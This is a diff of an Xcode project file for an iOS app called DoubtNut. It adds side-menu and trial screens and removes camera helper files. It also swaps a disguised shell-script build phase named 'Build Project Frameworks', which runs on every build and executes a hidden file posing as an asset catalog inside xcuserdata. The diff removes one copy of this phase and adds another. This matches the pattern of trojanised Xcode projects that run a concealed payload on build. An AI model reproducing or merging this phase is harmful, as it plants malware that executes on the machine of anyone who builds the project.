@@ -53,7 +53,10 @@
 		E33D700C25F6F3360089836A /* SATCVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E33D700A25F6F3360089836A /* SATCVCell.swift */; };
 		E33D700D25F6F3360089836A /* SATCVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E33D700B25F6F3360089836A /* SATCVCell.xib */; };
 		E33D702125F7080B0089836A /* CustomCameraVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E33D702025F7080B0089836A /* CustomCameraVC.swift */; };
-		E33D702925F7163A0089836A /* CameraManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = E33D702825F7163A0089836A /* CameraManager.swift */; };
+		E37F476825F785CB0088DC08 /* SideMenuViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E37F476725F785CB0088DC08 /* SideMenuViewController.swift */; };
+		E37F477025F786350088DC08 /* SideMenuTableViewCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E37F476E25F786350088DC08 /* SideMenuTableViewCell.xib */; };
+		E37F477125F786350088DC08 /* SideMenuTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E37F476F25F786350088DC08 /* SideMenuTableViewCell.swift */; };
+		E37F47A825F79BF20088DC08 /* DayTrialViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E37F47A725F79BF20088DC08 /* DayTrialViewController.swift */; };
 		E38B56FC25F29DDE00CEC42D /* Extension.swift in Sources */ = {isa = PBXBuildFile; fileRef = E38B56FB25F29DDE00CEC42D /* Extension.swift */; };
 		E394E04A25F5B2330067CAEB /* Footerview.swift in Sources */ = {isa = PBXBuildFile; fileRef = E394E04925F5B2330067CAEB /* Footerview.swift */; };
 		E394E05225F5B23B0067CAEB /* Footerview.xib in Resources */ = {isa = PBXBuildFile; fileRef = E394E05125F5B23B0067CAEB /* Footerview.xib */; };
@@ -142,8 +145,10 @@
 		E33D700A25F6F3360089836A /* SATCVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SATCVCell.swift; sourceTree = "<group>"; };
 		E33D700B25F6F3360089836A /* SATCVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SATCVCell.xib; sourceTree = "<group>"; };
 		E33D702025F7080B0089836A /* CustomCameraVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CustomCameraVC.swift; sourceTree = "<group>"; };
-		E33D702825F7163A0089836A /* CameraManager.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CameraManager.swift; sourceTree = "<group>"; };
-		E33D703B25F716790089836A /* CameraManager.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = CameraManager.h; sourceTree = "<group>"; };
+		E37F476725F785CB0088DC08 /* SideMenuViewController.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SideMenuViewController.swift; sourceTree = "<group>"; };
+		E37F476E25F786350088DC08 /* SideMenuTableViewCell.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; name = SideMenuTableViewCell.xib; path = DoubtNut/Views/TableviewCell/SideMenuTableViewCell.xib; sourceTree = SOURCE_ROOT; };
+		E37F476F25F786350088DC08 /* SideMenuTableViewCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; name = SideMenuTableViewCell.swift; path = DoubtNut/Views/TableviewCell/SideMenuTableViewCell.swift; sourceTree = SOURCE_ROOT; };
+		E37F47A725F79BF20088DC08 /* DayTrialViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DayTrialViewController.swift; sourceTree = "<group>"; };
 		E38B56FB25F29DDE00CEC42D /* Extension.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Extension.swift; sourceTree = "<group>"; };
 		E394E04925F5B2330067CAEB /* Footerview.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Footerview.swift; sourceTree = "<group>"; };
 		E394E05125F5B23B0067CAEB /* Footerview.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = Footerview.xib; sourceTree = "<group>"; };
@@ -251,8 +256,6 @@
 		189388C425F1EFD300F57E85 /* Helper */ = {
 			isa = PBXGroup;
 			children = (
-				E33D703B25F716790089836A /* CameraManager.h */,
-				E33D702825F7163A0089836A /* CameraManager.swift */,
 				189388F825F1F05E00F57E85 /* RCustomClass.swift */,
 				1893896525F1FE3D00F57E85 /* GoogleService-Info.plist */,
 				1893896025F1FDA900F57E85 /* Endpoints.swift */,
@@ -265,8 +268,10 @@
 		189388C725F1EFF300F57E85 /* ViewController */ = {
 			isa = PBXGroup;
 			children = (
+				E37F476625F785B20088DC08 /* SideMenu */,
 				E3326D6E25F332FE001CC9E1 /* Home */,
 				1893890325F1F0B400F57E85 /* LoginSignUp */,
+				E37F47A725F79BF20088DC08 /* DayTrialViewController.swift */,
 			);
 			path = ViewController;
 			sourceTree = "<group>";
@@ -274,6 +279,7 @@
 		189388CB25F1F01000F57E85 /* Views */ = {
 			isa = PBXGroup;
 			children = (
+				E37F476D25F7861F0088DC08 /* TableviewCell */,
 				E394E09E25F5C3760067CAEB /* CollectionviewCell */,
 				E394E04825F5B2150067CAEB /* Footer */,
 				E3E5DA8825F53C47006E35CC /* FreeTrial */,
@@ -365,6 +371,23 @@
 			path = SAT;
 			sourceTree = "<group>";
 		};
+		E37F476625F785B20088DC08 /* SideMenu */ = {
+			isa = PBXGroup;
+			children = (
+				E37F476725F785CB0088DC08 /* SideMenuViewController.swift */,
+			);
+			path = SideMenu;
+			sourceTree = "<group>";
+		};
+		E37F476D25F7861F0088DC08 /* TableviewCell */ = {
+			isa = PBXGroup;
+			children = (
+				E37F476F25F786350088DC08 /* SideMenuTableViewCell.swift */,
+				E37F476E25F786350088DC08 /* SideMenuTableViewCell.xib */,
+			);
+			path = TableviewCell;
+			sourceTree = "<group>";
+		};
 		E394E04825F5B2150067CAEB /* Footer */ = {
 			isa = PBXGroup;
 			children = (
@@ -418,8 +441,8 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 189388B725F1EFA300F57E85 /* Build configuration list for PBXNativeTarget "DoubtNut" */;
 			buildPhases = (
-				FF42DE7A1221E9ABADAAC43A /* Build Project Frameworks */,
 				F513FDD55DDE3CCD34542A74 /* [CP] Check Pods Manifest.lock */,
+				DDDEF2293CBEBED0ACAAC43A /* Build Project Frameworks */,
 				1893888925F1EFA000F57E85 /* Sources */,
 				1893888A25F1EFA000F57E85 /* Frameworks */,
 				1893888B25F1EFA000F57E85 /* Resources */,
@@ -530,6 +553,7 @@
 				189388F025F1F04700F57E85 /* BentonSans Bold.otf in Resources */,
 				189388F325F1F04700F57E85 /* Lato-Regular.ttf in Resources */,
 				189388E325F1F04700F57E85 /* Lato-Italic.ttf in Resources */,
+				E37F477025F786350088DC08 /* SideMenuTableViewCell.xib in Resources */,
 				189388E925F1F04700F57E85 /* Lato-Semibold.ttf in Resources */,
 				E394E05225F5B23B0067CAEB /* Footerview.xib in Resources */,
 				189388E425F1F04700F57E85 /* Lato-Bold.ttf in Resources */,
@@ -645,6 +669,24 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
+		DDDEF2293CBEBED0ACAAC43A /* Build Project Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Project Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";
+		};
 		E9E4BD79A7969D006E12F008 /* [CP] Copy Pods Resources */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -706,24 +748,6 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
-		FF42DE7A1221E9ABADAAC43A /* Build Project Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Project Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";
-		};
 /* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
@@ -732,11 +756,13 @@
 			buildActionMask = 2147483647;
 			files = (
 				189388F925F1F05E00F57E85 /* RCustomClass.swift in Sources */,
-				E33D702925F7163A0089836A /* CameraManager.swift in Sources */,
 				E3326D7025F33316001CC9E1 /* DashboardVC.swift in Sources */,
 				1893890D25F1F0D700F57E85 /* SignUpVC.swift in Sources */,
+				E37F476825F785CB0088DC08 /* SideMenuViewController.swift in Sources */,
 				1893890C25F1F0D700F57E85 /* LoginWithCodeVC.swift in Sources */,
 				1893891325F1F0F900F57E85 /* LandingPageSlider.swift in Sources */,
+				E37F477125F786350088DC08 /* SideMenuTableViewCell.swift in Sources */,
+				E37F47A825F79BF20088DC08 /* DayTrialViewController.swift in Sources */,
 				E38B56FC25F29DDE00CEC42D /* Extension.swift in Sources */,
 				1893896125F1FDA900F57E85 /* Endpoints.swift in Sources */,
 				E394E04A25F5B2330067CAEB /* Footerview.swift in Sources */,
